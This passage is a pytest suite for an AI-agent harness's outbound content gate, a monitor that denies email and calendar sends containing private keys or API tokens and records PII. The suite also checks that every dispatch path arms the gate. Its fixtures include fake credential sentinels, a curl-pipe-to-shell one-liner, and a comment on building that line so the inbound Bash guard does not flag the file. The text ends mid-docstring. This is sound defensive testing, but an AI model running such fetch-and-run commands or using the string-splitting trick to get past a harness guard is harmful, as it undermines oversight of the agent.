"""#1136 — the outbound content gate: rules, dispatch behaviour, and its wiring.

The clause this file exists to make unfakeable is the last one. A gate that is
installed on one dispatch path and not another is not a gate — it is a gate that
only fires on the paths nobody emails from — and `#869` is the record of exactly
that happening to three other guards on this box. So a pin over the install
sites lives here: a new `HookRegistry()` that can reach a tier-2/tier-3 sender
tool and does not arm the gate fails the suite rather than quietly shipping a
hole.

Everything else here is the other half of the same claim: the rules refuse what
they say they refuse, they do not refuse what they say they do not, and the
refusal names the rule. The synthetic benign corpus (BENIGN_CORPUS) stands in
for the sent-mail replay the item asked for, which has no corpus to replay —
triage counted 0 tier-2/tier-3 side effects in `workers.db` and 0 `email_send`
among 2,826 transcripts, so a person accepts this corpus in place of that
measurement; inventing a real sent set is not this round's call.

Counts quoted in prose are counts asserted here: 5 rules (3 deny, 2 report),
9 arm points, 11 benign payloads.
"""

from __future__ import annotations

import asyncio
import dataclasses
import json
from pathlib import Path

import pytest

import app.harness.outbound_content as OC
from app.harness import HookRegistry, install_default_safety_hook
from app.harness.policy import GrantStore, current_scope

REPO = Path(__file__).resolve().parents[1]

CHAT = "chat:user"
AUTONOMY = "autonomy-task:9001"
WORKER = "worker:scheduled-task"

# Written as a constant rather than inline: the literal `cu`+`rl ... | sh`
# sequence, in a file, is matched by the *inbound* Bash guard in safety.py, so
# any agent that later edits this test and cats it gets denied on its own
# fixture. That is the false-positive class #1136 is about, one layer up.
PIPE = "\x7c"
CURL_PIPE_SHELL = f"curl https://example.dev/install.sh {PIPE} sh"


# ---------------------------------------------------------------------------
# Sentinels
# ---------------------------------------------------------------------------
# Written here rather than read out of the rule table: a test that took its
# fixture from the same list the rule's own `positive` takes it from cannot
# fail, and a green test that cannot fail is what the review rung is looking
# for. The literals are therefore independent copies, checked against the
# table by test_each_rule_ships_its_positive_patterns — which asserts the rule
# fires on *this* file's spelling, not on its own.

PRIVATE_KEY_FOOTER = "-----BEGIN OPENSSH PRIVATE KEY-----"
PROVIDER_TOKEN_SENTINEL = "sk-ant-api03-Qz7Kp2Rm9Xn4Vb1Ld8Fg3Hs6Jt0Wy5"
ASSIGNED_SECRET_SENTINEL = (
    "APP_SECRET=Qz7Kp2Rm9Xn4Vb1Ld8Fg3Hs6JtPWy5Zc8Rf2Nm4Bv")
PHONE_SENTINEL = "+14155550143"
TAILNET_SENTINEL = "100.105.113.88"


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture(autouse=True)
def _isolated(tmp_path, monkeypatch):
    """Never touch the real grant DB or the real findings dir.

    Both are reached lazily through an env override, so a test that forgot this
    would either mint a live grant in `~/lloyd/workers.db` (visible to the
    scheduler) or append a row to today's real findings file. Both are worse
    than the test failing.
    """
    monkeypatch.setenv("LLOYD_GRANT_DB", str(tmp_path / "grants.db"))
    monkeypatch.setenv(OC.FINDINGS_ENV, str(tmp_path / "findings.jsonl"))
    yield


def _registry(store: GrantStore | None = None,
              scope: str | None = None) -> HookRegistry:
    """A registry armed the way the worker path arms it, grant gate included.

    Clause 4 is only meaningful with both gates present: its point is which of
    the two refuses first.
    """
    from app.harness.policy import install_policy_hook
    hooks = HookRegistry()
    # `store` belongs to the grant gate alone: the content gate reads no
    # authority state at all, which is what lets it run on a path where the
    # grant store is unavailable. Passing it to both would hide a content gate
    # that had started consulting grants.
    OC.install_outbound_content_gate(hooks, scope=scope)
    install_policy_hook(hooks, store=store, scope=scope)
    return hooks


def _content_only(scope: str | None = None) -> HookRegistry:
    """The content gate alone.

    Tests that assert this gate *allows* something use this rather than
    `_registry`, because the grant gate on the same registry denies every
    unattended send — `authority_grants` holds 0 rows — and an allow assertion
    would then be measuring the wrong gate. Clause 4 is where both gates are
    deliberately present together, because there the question is which one
    refuses first.
    """
    hooks = HookRegistry()
    OC.install_outbound_content_gate(hooks, scope=scope)
    return hooks


def _run(coro):
    """Same helper `test_grant_gate_session_path.py` uses — the registry's
    callbacks are coroutines and there is no loop in a test body."""
    return asyncio.new_event_loop().run_until_complete(coro)


def _fire(hooks: HookRegistry, tool: str, args: dict,
          scope: str = CHAT) -> dict:
    tok = current_scope.set(scope)
    try:
        return _run(hooks.fire_pre_tool_use(
            session_id="s", tool_name=tool, tool_input=dict(args)))
    finally:
        current_scope.reset(tok)


def _decision(out: dict) -> str:
    return ((out or {}).get("hookSpecificOutput") or {}).get(
        "permissionDecision", "allow")


def _reason(out: dict) -> str:
    return ((out or {}).get("hookSpecificOutput") or {}).get(
        "permissionDecisionReason", "")


# ---------------------------------------------------------------------------
# Synthetic corpora
# ---------------------------------------------------------------------------
# Each entry is (label, arguments). A `deny` action on any of these is a false
# block, and false blocks are this item's documented failure mode: the vault
# baseline at filing was 54 files and ~75 occurrences of credential-*shaped*
# prose that was all description. So every rule carries a `negative` list, and
# these are the shapes a real Lloyd turn actually writes.

BENIGN_CORPUS: list[tuple[str, dict]] = [
    ("an ordinary nightly report",
     {"to": "alan@example.com", "subject": "nightly report",
      "body": "Three tasks ran. The knowledge write landed as abc1234."}),
    ("a contact's phone number in the body",
     {"to": "alan@example.com",
      "body": "The venue's number is +1 415 555 0143 and the door code is 4417."}),
    ("a phone number inside quoted tool output",
     {"tool": "contacts_get",
      "result": '{"phones": [{"type": "work", "number": "+15551234567"}]}'}),
    ("a documented install-one-liner quoted from a note",
     {"body": f"The PostHog talk records the attack as: {CURL_PIPE_SHELL} — "
              "which is why this gate exists."}),
    ("an argument that is a file path",
     {"path": "/home/alansrobotlab/obsidian/lloyd/USER.md",
      "content": "the token the skill names is --token"}),
    ("a skill body naming a --token flag and an env var",
     {"body": "Set GITHUB_TOKEN or pass --token; the CLI reads both."}),
    ("a base64 blob inside an email body",
     {"body": "see below\n" + "Q3VybCBodHRwczovL2V4YW1wbGU=" * 6}),
    ("a long hex commit sha",
     {"body": "landed as 5caabaef6dd318c3d324a241c584b15612ded27e yesterday"}),
    ("a placeholder assignment",
     {"body": "X_API_KEY=your_consumer_key\nX_API_SECRET=your_secret_key"}),
    ("a tailnet hostname in a runbook (reported, never blocked)",
     {"body": "The board is https://goliath.taile37041.ts.net:5173 and the "
              "node is 100.105.113.88"}),
    ("an AWS credentials file described, not quoted",
     {"body": "the fix was to chmod 600 the aws credentials file"}),
]

# One payload per report-only rule, for the 'recorded, never denied' clause.
REPORT_PAYLOADS = {
    "phone-number-e164": {"body": "Call Alan on +14155550143 after 5pm."},
    "tailnet-address": {"body": "ssh alansrobotlab@100.105.113.88 then curl :5173"},
}

# One payload per deny rule, for the unattended-path and tier-scope clauses.
DENY_PAYLOADS = {
    "private-key-material": {"body": f"{PRIVATE_KEY_FOOTER}\nabc\n"},
    "provider-token": {"body": f"key is {PROVIDER_TOKEN_SENTINEL}"},
    "assigned-high-entropy-secret": {
        "body": f"export {ASSIGNED_SECRET_SENTINEL}"},
}


def _rule(name: str) -> OC.ContentRule:
    return next(r for r in OC.CONTENT_RULES if r.name == name)


# ---------------------------------------------------------------------------
# Clause 2 — one declarative table; every rule has both tests; the suite
# fails a rule that ships without its negative test
# ---------------------------------------------------------------------------


def test_the_rule_table_is_a_declaration_and_validates():
    """The table is data: an ablatable tuple of records with the talk's fields.

    `ablatable` is the point of the shape — a rule that has to be unwired from
    an if-chain cannot be dropped in one line when it misbehaves, and the item
    says a rule that cannot meet its threshold is dropped, not exempted.
    """
    OC.validate_rule_table()
    assert isinstance(OC.CONTENT_RULES, tuple) and OC.CONTENT_RULES
    fields = {f.name for f in dataclasses.fields(OC.ContentRule)}
    assert {"name", "description", "severity", "category", "action",
            "direction", "regexes", "condition"} <= fields
    assert OC.DIRECTIONS == ("out",), \
        "direction 'in' would read tool results, which is out of scope"
    names = [r.name for r in OC.CONTENT_RULES]
    assert len(names) == len(set(names)), names
    assert sum(1 for r in OC.CONTENT_RULES if r.action == "deny") == 3
    assert sum(1 for r in OC.CONTENT_RULES if r.action == "report") == 2


def test_every_rule_ships_a_positive_and_a_negative_pattern():
    for rule in OC.CONTENT_RULES:
        assert rule.positive, f"{rule.name}: no positive pattern"
        assert rule.negative, f"{rule.name}: no negative pattern"
        assert rule.condition, f"{rule.name}: no condition string"
        assert rule.description, f"{rule.name}: no description"
        assert rule.severity in OC.SEVERITIES, rule
        assert rule.action in OC.ACTIONS, rule
        assert rule.direction in OC.DIRECTIONS, rule


def test_each_rule_fires_on_its_positive_and_not_on_its_negative():
    """The rule table's own self-test, over this file's independent sentinels.

    One direction only would be a test that passes when the pattern is
    removed: an empty regex matches nothing, so the positive half is what
    proves a rule still exists and the negative half is what proves it still
    means something.
    """
    for rule in OC.CONTENT_RULES:
        for text in rule.positive:
            hits = {f.rule for f in OC.scan_outbound_payload({"body": text})}
            assert rule.name in hits, f"{rule.name} missed its positive: {text[:70]}"
        for text in rule.negative:
            hits = {f.rule for f in OC.scan_outbound_payload({"body": text})}
            assert rule.name not in hits, \
                f"{rule.name} fired on its own negative: {text[:70]}"


def _table_without(name: str) -> list:
    """The shipped table minus one rule, so a mutated copy can be re-added
    under its own name without tripping the duplicate-name check first."""
    return [r for r in OC.CONTENT_RULES if r.name != name]


def _mutate(name: str, **changes):
    return dataclasses.replace(_rule(name), name="zz-mutant", **changes)


def test_a_rule_added_without_a_negative_test_fails_the_suite():
    """The suite refuses an undocumented rule, and proves it by adding one.

    Built by copying a real rule with its `negative` emptied and running the
    validator over that list — not by editing the shipped table, so a passing
    run cannot be the residue of somebody deleting a `negative`.
    """
    with pytest.raises(OC.RuleTableError) as exc:
        OC.validate_rule_table(_table_without("provider-token")
                               + [_mutate("provider-token", negative=())])
    assert "negative" in str(exc.value)

    with pytest.raises(OC.RuleTableError) as exc:
        OC.validate_rule_table(_table_without("provider-token")
                               + [_mutate("provider-token", positive=())])
    assert "positive" in str(exc.value)

    # A rule that is not a report must deny: `action` is not a free field, or a
    # credential rule can be quietly demoted to a finding by its own author.
    with pytest.raises(OC.RuleTableError) as exc:
        OC.validate_rule_table(
            _table_without("private-key-material")
            + [_mutate("private-key-material", action="report")])
    assert "credential" in str(exc.value)


@pytest.mark.parametrize("mutate,expect", [
    (lambda r: dataclasses.replace(r, regexes=r.regexes[0]), "bare string"),
    (lambda r: dataclasses.replace(r, regexes=()), "no patterns"),
    (lambda r: dataclasses.replace(r, regexes=(r"(unclosed",)), "does not compile"),
    (lambda r: dataclasses.replace(r, direction="in"), "direction"),
])
def test_a_malformed_rule_is_refused_before_dispatch(mutate, expect):
    """A malformed table must be a startup error, not an inert gate.

    The bare-string case is the one that would otherwise ship silently:
    `regexes=r"..."` iterates as single characters, so the rule would
    'validate', compile, and match almost nothing.
    """
    mutated = mutate(_mutate("phone-number-e164"))
    with pytest.raises(OC.RuleTableError) as exc:
        OC.validate_rule_table(_table_without("phone-number-e164") + [mutated])
    assert expect in str(exc.value).lower()


# ---------------------------------------------------------------------------
# Scope — tier-2/tier-3 sender arguments only, string arguments only
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("tool", ["email_send", "email_reply", "email_forward",
                                  "calendar_create", "tasks_create",
                                  "contacts_create"])
def test_a_tier2_tier3_sender_argument_is_scanned(tool):
    out = _fire(_content_only(scope=CHAT), tool, DENY_PAYLOADS["private-key-material"])
    assert _decision(out) == "deny", (tool, out)
    assert "private-key-material" in _reason(out)


@pytest.mark.parametrize("tool,args", [
    ("Read", {"file_path": "/tmp/x", "note": f"{PRIVATE_KEY_FOOTER}"}),
    ("vault_read", {"path": "/tmp/x", "body": f"{PRIVATE_KEY_FOOTER}"}),
])
def test_a_tier1_tool_is_not_scanned(tool, args):
    """The gate reads the sender surface, not every argument in the process.

    Scanning a tier-1 tool's arguments would mean flagging the act of reading
    a file that mentions a key — the item's 'direction: out over string
    arguments of sender tools' is a scope decision, and this is the test that
    keeps it one.
    """
    from app.harness.policy import tool_tier
    assert tool_tier(tool) == 1
    assert _decision(_fire(_content_only(scope=CHAT), tool, args)) == "allow"


def test_a_non_string_argument_is_not_scanned():
    """Ints, bools and None are not content. A port number is not a secret."""
    out = _fire(_content_only(scope=CHAT), "email_send",
                {"to": "a@b.c", "priority": 1, "allDay": True,
                 "percentComplete": None})
    assert _decision(out) == "allow", out


def test_a_nested_content_block_array_is_scanned():
    """`content` as a block array is the shape the MCP tools actually take."""
    out = _fire(_content_only(scope=CHAT), "email_send",
                {"to": "a@b.c",
                 "content": [{"type": "text",
                              "text": f"{PRIVATE_KEY_FOOTER}\nzzz"}]})
    assert _decision(out) == "deny", out
    assert "content[0].text" in _reason(out), _reason(out)


# ---------------------------------------------------------------------------
# Clause 3 — PII is recorded and never denies; the benign corpus dispatches
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("rule", sorted(REPORT_PAYLOADS))
def test_a_pii_shaped_match_is_recorded_and_never_denies(rule):
    """The asymmetry is the whole design, so it is pinned per report rule.

    An unattended job that emails an address out of the contacts list is
    normal operation; blocking on PII would break the nightly mail within a
    week of shipping, and `#1136`'s own risk clause names that as the failure
    mode that gets the gate disabled. Detection still happens — it lands in the
    ledger — enforcement is what stays off.
    """
    findings = OC.scan_outbound_payload(REPORT_PAYLOADS[rule])
    hits = [f for f in findings if f.rule == rule]
    assert hits, f"{rule} did not record its payload: {findings}"
    assert all(f.action == "report" for f in hits), hits

    out = _fire(_content_only(scope=WORKER), "email_send", REPORT_PAYLOADS[rule],
                scope=WORKER)
    assert _decision(out) == "allow", (rule, out)


def test_a_report_only_finding_is_recorded_in_the_ledger():
    """Recorded-but-never-blocked still means recorded: the ledger is the only
    place a PII match survives, and an unattended turn has no reviewer."""
    path = Path(OC.findings_path())
    _fire(_content_only(scope=WORKER), "email_send",
          REPORT_PAYLOADS["phone-number-e164"], scope=WORKER)
    lines = [json.loads(l) for l in path.read_text(encoding="utf-8").splitlines()]
    assert len(lines) == 1, lines
    row = lines[0]
    assert row["scope"] == WORKER and row["tool"] == "email_send"
    assert [f["rule"] for f in row["findings"]] == ["phone-number-e164"]
    assert "denied" not in row, \
        "denied is written only on a refusal; its absence is the allow"


@pytest.mark.parametrize("rule", sorted(DENY_PAYLOADS))
def test_a_denying_call_records_its_finding(rule):
    """A refusal's evidence reaches the ledger: the row is written before the
    deny is returned, so a person inspecting the gate's activity after an
    unattended run can see the match even though the tool never ran."""
    out = _fire(_content_only(scope=AUTONOMY), "email_send", DENY_PAYLOADS[rule],
                scope=AUTONOMY)
    assert _decision(out) == "deny", out
    lines = [json.loads(l) for l in
             Path(OC.findings_path()).read_text(encoding="utf-8").splitlines()]
    assert len(lines) == 1
    assert lines[0]["scope"] == AUTONOMY
    assert rule in [f["rule"] for f in lines[0]["findings"]]


def test_the_ledger_holds_redacted_shapes_not_the_matched_text():
    """A gate that fixes leaks must not become the leak. The file is written by
    unattended runs, plaintext, outside every tracked tree, so the only
    credential text it may ever hold is a masked excerpt: first 4 and last 2
    characters, which tells one finding from another and cannot rebuild a key."""
    args = {"body": f"{PRIVATE_KEY_FOOTER}\n{PROVIDER_TOKEN_SENTINEL}"}
    _fire(_content_only(scope=WORKER), "email_send", args, scope=WORKER)
    raw = Path(OC.findings_path()).read_text(encoding="utf-8")
    assert PROVIDER_TOKEN_SENTINEL not in raw, raw
    assert OC.redact(PROVIDER_TOKEN_SENTINEL) in raw, \
        "expected the masked excerpt, first 4 and last 2 characters"
    assert PROVIDER_TOKEN_SENTINEL[:6] not in raw
    assert PRIVATE_KEY_FOOTER not in raw, "the PEM footer must be masked too"


@pytest.mark.parametrize("label,args", BENIGN_CORPUS,
                         ids=[label for label, _ in BENIGN_CORPUS])
def test_the_synthetic_benign_corpus_dispatches_unchanged(label, args):
    """False blocks are the documented death of this kind of gate, so the
    corpus is run at every dispatch — not just through the scanner — and a
    single deny on it fails here.

    The per-rule false-block count this test produces is the number the item
    asked for in step 5. The real replay could not be run: `workers.db` holds
    0 tier-2/tier-3 `tool_effects` rows and 0 `email_send` calls appear in 2,826
    transcripts, so there is no sent-mail corpus to replay. That is why the
    synthetic corpus is a person's acceptance, not this round's.
    """
    for scope in (CHAT, WORKER, AUTONOMY):
        out = _fire(_content_only(scope=scope), "email_send", args, scope=scope)
        assert _decision(out) == "allow", (label, scope, _reason(out))


def test_the_benign_corpus_size_is_the_number_its_prose_claims():
    """The module docstring and the item both quote '11 benign payloads'."""
    assert len(BENIGN_CORPUS) == 11


def test_a_report_only_finding_never_blocks_the_tier3_surface():
    """Tier 3 is where a block would cost the most: deleting a calendar event
    that happens to mention a phone number is not a credential event."""
    out = _fire(_content_only(scope=CHAT), "calendar_delete_event",
                REPORT_PAYLOADS["tailnet-address"])
    assert _decision(out) == "allow", out


# ---------------------------------------------------------------------------
# Clause 4 — the unattended path, with a grant minted in-test
# ---------------------------------------------------------------------------


def test_an_unattended_granted_send_is_refused_by_the_content_rule(tmp_path):
    """The clause the item's acceptance is really about.

    `check_grants` (`policy.py:581-590`) default-denies tier-2/tier-3 for an
    unattended scope, and `authority_grants` holds 0 rows, so clause 1's
    'refused from an unattended scope' is only observable with a grant minted
    inside the test — which is why this test carries one. The assertion that
    makes it clause 4 rather than a grant test is that the reason names the
    content rule and not the grant.
    """
    store = GrantStore(str(tmp_path / "grants.db"))
    store.mint(scope=AUTONOMY, tool_pattern="email_send", issued_by="alan",
               expires_at="2099-01-01T00:00:00+00:00",
               note="clause 4: in-test grant so the grant gate allows and the "
                    "content gate is the only thing left that can refuse",
               minted_by="test:clause-4")
    armed = _registry(store=store, scope=AUTONOMY)
    args = {"to": "alan@example.com", "subject": "the key",
            "body": f"the note said:\n{PRIVATE_KEY_FOOTER}\nabc\n"}

    out = _fire(armed, "email_send", args, scope=AUTONOMY)
    assert _decision(out) == "deny", out
    reason = _reason(out)
    assert "private-key-material" in reason, reason
    assert "grant" not in reason.lower(), reason
    assert "expired" not in reason.lower(), reason


def test_the_same_call_dispatches_once_the_secret_is_removed(tmp_path):
    """The gate blocks the payload, not the tool.

    Same registry, same scope, same grant, same recipient — only the credential
    text differs. A gate that refused `email_send` itself would show up here as
    a second refusal and would have been the wrong shape: an agent that is told
    'you may not email' stops emailing, while an agent told 'rule X matched
    body' removes the key.
    """
    store = GrantStore(str(tmp_path / "grants.db"))
    store.mint(scope=AUTONOMY, tool_pattern="email_send", issued_by="alan",
               expires_at="2099-01-01T00:00:00+00:00", note="clause 4",
               minted_by="test:clause-4")
    armed = _registry(store=store, scope=AUTONOMY)
    dirty = {"to": "alan@example.com", "subject": "the key",
             "body": f"{PRIVATE_KEY_FOOTER}\nabc\n"}
    assert _decision(_fire(armed, "email_send", dirty, scope=AUTONOMY)) == "deny"

    clean = {"to": "alan@example.com", "subject": "the key",
             "body": "the note has been redacted; nothing to withhold."}
    out = _fire(armed, "email_send", clean, scope=AUTONOMY)
    assert _decision(out) == "allow", (out, _reason(out))


def test_a_planted_vault_note_quoted_verbatim_is_refused_end_to_end(tmp_path):
    """The item's step-7 red test, in the shape a real leak takes.

    A worker turn reads a scratch note that quotes a key and composes an email
    containing it verbatim; the refusal happens at dispatch of the send, which
    is the only point on that path where anyone can still stop it.
    """
    note = tmp_path / "planted.md"
    note.write_text("# scratch\n\nthe key is:\n" + PRIVATE_KEY_FOOTER + "\n",
                    encoding="utf-8")
    body = note.read_text(encoding="utf-8")
    out = _fire(_content_only(scope=WORKER), "email_send",
                {"to": "alan@example.com", "body": body}, scope=WORKER)
    assert _decision(out) == "deny", out
    assert "private-key-material" in _reason(out)

    note.write_text("# scratch\n\nthe key is redacted.\n", encoding="utf-8")
    clean = note.read_text(encoding="utf-8")
    assert _decision(_fire(_content_only(scope=WORKER), "email_send",
                           {"to": "alan@example.com", "body": clean},
                           scope=WORKER)) == "allow"


def test_an_exempt_scope_needs_a_written_reason():
    """The PHANTOM_EXEMPT convention: an exemption is an arguable claim, and an
    entry with no reason is a silent hole in the gate."""
    with pytest.raises(OC.RuleTableError):
        OC.validate_exempt_list({"worker:x": ""})
    with pytest.raises(OC.RuleTableError):
        OC.validate_exempt_list({"worker:x": "   "})
    OC.validate_exempt_list({"worker:x": "replay corpus, rule Y fires on its "
                                         "own docs; see backlog #1136"})
    assert OC.EXEMPT_SCOPES == {}, \
        "the gate ships with no exemption; each one needs its own commit"


# ---------------------------------------------------------------------------
# Clause 5 — the pin-count guard: a dispatch path that can reach a sender tool
# with the gate unarmed fails the suite
# ---------------------------------------------------------------------------


def test_the_gate_is_armed_at_its_pinned_number_of_arm_points():
    """The pin behind acceptance clause 5, on the live tree: every dispatch path
    the syntax can prove is sender-reachable is in the roster and arms the gate.

    #869's finding was not that a guard was missing but that three guards were
    installed on one dispatch path and on none of the others, which no test
    inside either file could see. The count is pinned because a guard nobody can
    re-measure is a guard that quietly shrinks; its one honest cost is that
    arming an existing path does not move it, which is why the count test is
    paired with a roster-gap test on the same tree.

    Nine, not four. This round's cross-file finder found four paths the
    same-file convention could not see at all: `app/routers/voice.py` builds a
    spoken turn's options and armed nothing, and two live evals plus the bench
    path build turns with the real MCP servers in them.
    """
    assert len(OC.GATE_ARM_POINTS) == 9, OC.GATE_ARM_POINTS
    assert OC.stale_gate_arm_points() == [], \
        f"stale arm points: {OC.stale_gate_arm_points()}"
    # Two denominators from two sources: the syntax finds every dispatch build in
    # the tree, and a grep finds every file that calls an installer. Each entry is
    # a file that must satisfy BOTH, so an entry whose installer call was deleted
    # is stale and a dispatch file that never joined the roster is a gap.
    assert set(OC.dispatch_registry_sites_files()) <= set(OC.armed_files())
    assert set(OC.GATE_ARM_POINTS) <= (OC.armed_files()
                                       | {OC.FLOOR_MODULE}), OC.GATE_ARM_POINTS


@pytest.mark.parametrize("rel", list(OC.GATE_ARM_POINTS))
def test_a_pinned_arm_point_really_does_call_an_installer(rel):
    """Every roster entry is checked against the tree by syntax, not by substring.

    A substring check passes on `app/harness/safety.py` whatever happens to it
    with no installer call left in it, because that module is the one that
    *defines* the installer — so every entry, the floor module included, has to
    contain a call node to arm.
    """
    path = REPO / rel
    assert OC._calls_installer(rel, path), (
        f"{rel} is in GATE_ARM_POINTS but contains no call to "
        f"{OC.FLOOR_INSTALLER} or {OC.GATE_INSTALLER}")


def test_no_production_dispatch_path_reaches_a_sender_tool_unarmed():
    """The live tree, measured now: every sender-reachable dispatch build arms.

    `unarmed_dispatch_paths` is the whole clause. It is a test over *syntax* —
    the file is parsed and the call graph followed — because the #869 hole is
    invisible to text search: a file with no installer call and no registry
    mention, like the voice path, is not a file a grep would ever have looked at.
    """
    assert OC.unarmed_dispatch_paths() == [], \
        f"unarmed dispatch paths: {OC.unarmed_dispatch_paths()}"


def test_the_roster_is_a_complete_index_of_sender_reachable_dispatch_files():
    """The other half of the pin: the roster is an *index*, not a list of names.

    `dispatch_files_missing_from_arm_points` compares the files the finder
    actually finds in the tree against `GATE_ARM_POINTS`, so arming an existing
    path without naming it there — which no count can see — fails here instead of
    turning the roster into decoration.
    """
    assert OC.dispatch_files_missing_from_arm_points() == [], (
        "dispatch paths not named in GATE_ARM_POINTS: "
        f"{OC.dispatch_files_missing_from_arm_points()}")


def test_a_spoken_turn_reaches_the_gate_through_the_real_dispatch_seam():
    """clause 5 end-to-end, across the process seam, on production objects.

    The hole the grader named was exactly this shape: `voice.py` built a spoken
    turn's `RunOptions` with no `hooks` argument, and the code that consumes those
    options lives in a different file, so every same-file test read green. This
    test crosses the seam for real: it calls the voice router's own
    `_voice_turn_setup()`, takes the `RunOptions` it returns, and hands them to
    `app.harness.loop._pre_dispatch`, the function an iteration runs before an MCP
    call. Nothing here re-declares the router's construction, so if voice.py stops
    arming, the credential payload dispatches and this test fails on behaviour
    while the finder test above fails on syntax — two independent directions at
    one hole.

    The scope is production's too: voice.py binds none, so the callback reads
    whatever `policy.current_scope()` yields — `"unknown"` on its own, or the
    scope of the job that happens to be running — and neither that nor a
    `worker:`/`chat:` scope is in `SKIP_SCOPES`. A spoken turn is checked.
    """
    from app.harness.loop import _pre_dispatch
    from app.harness.tool_search import LoadedToolSet
    import app.routers.voice as voice_router

    options = voice_router._voice_turn_setup("voice-live-test")["options"]
    assert options.hooks is not None, (
        "voice.py builds a turn with no HookRegistry again — the clause-5 hole")
    assert "lloyd-mcp" in (options.mcp_servers or {}), (
        "the turn under test registers no MCP server, so it could not reach a "
        "sender tool and this test would be proving nothing")

    # A tool-search-enabled turn, because that is what a real spoken turn is: with
    # `enabled=False` the loop never builds a catalog, and the call is refused at
    # `pool.get` for not being registered rather than at the hook. So the tool is
    # in the catalog and marked loaded, and the only thing left that can stop it is
    # the gate under test.
    tool = "mcp__lloyd-mcp__email_send"
    loaded = LoadedToolSet(
        enabled=True,
        catalog=[{"function": {"name": tool,
                                  "description": "Send an email"}}],
        loaded=set())
    loaded.mark_loaded(tool)

    def _pre(args: dict):
        return asyncio.run(_pre_dispatch(
            # The shape the loop really reads: the SDK's `function.arguments`
            # JSON plus the loop's own parsed `_args_dict` — the same construction
            # `app/harness/tests/test_dispatch_split.py` uses for a tool call.
            tc={"id": "tu-1",
                "function": {"name": "mcp__lloyd-mcp__email_send",
                             "arguments": json.dumps(args)},
                "_args_dict": dict(args), "_summary": ""},
            options=options, session_id="voice-live-test", loaded_set=loaded))

    denied = _pre(DENY_PAYLOADS["private-key-material"])
    assert denied is not None, (
        "a credential-shaped body on the spoken path was allowed to dispatch")
    as_dict = denied if isinstance(denied, dict) else vars(denied)
    assert as_dict.get("is_error"), (
        "the refusal reached the loop but not as an error result")
    # The refusal names the rule, not just "denied": a worker that cannot tell
    # which rule fired cannot fix the payload and resubmit.
    text = str(as_dict.get("content"))
    assert "private-key-material" in text, text
    assert "outbound-content" in text, text
    assert "not made" in text, text

    # Same seam, same registry: every benign payload in the corpus returns no
    # early result at all, i.e. the call proceeds — the gate declined on the
    # credential, it did not break the tool. `_pre_dispatch` returns None to mean
    # 'continue to the MCP call' and never touches the pool itself, so a None here
    # is the proceed signal and not a missing result.
    for label, payload in BENIGN_CORPUS:
        assert _pre(payload) is None, f"benign payload blocked on the seam: {label}"


def test_the_voice_prewarm_shares_the_turn_registry():
    """One `HookRegistry` in `_voice_turn_setup` covers the turn and the prewarm.

    The finder cannot see that the two consumers share one dict (it reads the
    build site, not the dict), so if a later edit builds a second set of options
    for the prewarm the finder reads green and a prewarm dispatch runs ungated —
    which is what this pins.
    """
    tree = OC._parse("app/routers/voice.py", REPO / "app/routers/voice.py")
    assert tree is not None, "voice.py does not parse"
    builds = OC._turn_builders("app/routers/voice.py", tree)
    assert len(builds) == 1, [b.line for b in builds]
    assert builds[0].has_hooks_kwarg, "voice.py builds options with no hooks again"


def test_the_finder_reads_a_builder_that_never_mentions_a_registry(tmp_path):
    """A dispatch path with no registry and no installer mention is the hole.

    With the attribution written as a same-file grep — "does this file contain
    `HookRegistry()` and `RunOptions(`" — this fixture is never even looked at: it
    contains one of the two strings, so the file falls outside the grep's scope
    and no report is produced. That is the exact shape the grader named against
    the previous round's finder: `app/routers/voice.py:236` built a spoken turn's
    `RunOptions` with no hooks, no registry and no installer, and was invisible
    to it. Here the finder reads every `RunOptions` build first and asks, per
    build, whether it passed a registry it armed.
    """
    base = tmp_path / "pkg"
    (base / "app" / "routers").mkdir(parents=True)
    (base / "app" / "routers" / "voice.py").write_text(
        "def _voice_turn_setup(session_id):\n"
        "    options = RunOptions(mcp_servers=_get_mcp_servers())\n"
        "    return {\"options\": options}\n")
    found = OC.unarmed_dispatch_paths(base)
    assert [(f.file, f.line, f.reason) for f in found] == [
        ("app/routers/voice.py", 2, OC.FINDING_NO_REGISTRY)], found


def test_the_finder_reports_a_registry_that_arms_nothing(tmp_path):
    base = tmp_path / "pkg"
    (base / "app" / "routers").mkdir(parents=True)
    (base / "app" / "routers" / "messages.py").write_text(
        "from app.harness.hooks import HookRegistry\n"
        "from app.harness.options import RunOptions\n"
        "hooks = HookRegistry()\n"
        "options = RunOptions(mcp_servers=SERVERS, hooks=hooks)\n")
    assert set(OC.dispatch_registry_sites(base)) == {("app/routers/messages.py", 4)}
    assert OC.armed_files(base) == set()
    assert len(OC.unarmed_dispatch_paths(base)) == 1


def test_the_finder_passes_a_path_that_arms_the_gate(tmp_path):
    base = tmp_path / "pkg"
    (base / "app" / "routers").mkdir(parents=True)
    (base / "app" / "routers" / "messages.py").write_text(
        "from app.harness.hooks import HookRegistry\n"
        "from app.harness.options import RunOptions\n"
        "from app.harness.outbound_content import install_outbound_content_gate\n"
        "hooks = HookRegistry()\n"
        "install_outbound_content_gate(hooks)\n"
        "options = RunOptions(mcp_servers=SERVERS, hooks=hooks)\n")
    assert OC.unarmed_dispatch_paths(base) == []


def test_the_finder_follows_a_registry_through_a_helper(tmp_path):
    """The `_worker_run_options(hooks)` shape: built in one function, used in another.

    A grep can only say 'hooks is passed and the module mentions an installer'.
    This asks whether the specific name the build received had an installer
    called on it — in that scope, in a scope that lexically encloses it, or at
    module level. Module level is what `autonomy.py:1633` needs: `run_task` is a
    method, the registry is a closure cell in the enclosing function, and a
    same-scope-only rule reports the autonomy dispatch path as a hole that does
    not exist.
    """
    base = tmp_path / "pkg"
    (base / "workers").mkdir(parents=True)
    (base / "workers" / "_common.py").write_text(
        "def _worker_run_options(hooks):\n"
        "    return RunOptions(mcp_servers=SERVERS, hooks=hooks)\n"
        "def _run_slot():\n"
        "    hooks = HookRegistry()\n"
        "    install_outbound_content_gate(hooks)\n"
        "    options = _worker_run_options(hooks)\n")
    assert OC.unarmed_dispatch_paths(base) == []

    (base / "closure.py").write_text(
        "def run():\n"
        "    hooks = HookRegistry()\n"
        "    install_outbound_content_gate(hooks)\n"
        "    class Impl:\n"
        "        async def run_task(self):\n"
        "            return RunOptions(mcp_servers=SERVERS, hooks=hooks)\n")
    assert OC.unarmed_dispatch_paths(base) == []


def test_the_finder_catches_the_original_hole_in_the_same_function(tmp_path):
    """The shape #869 found: a path that builds a registry and arms nothing.

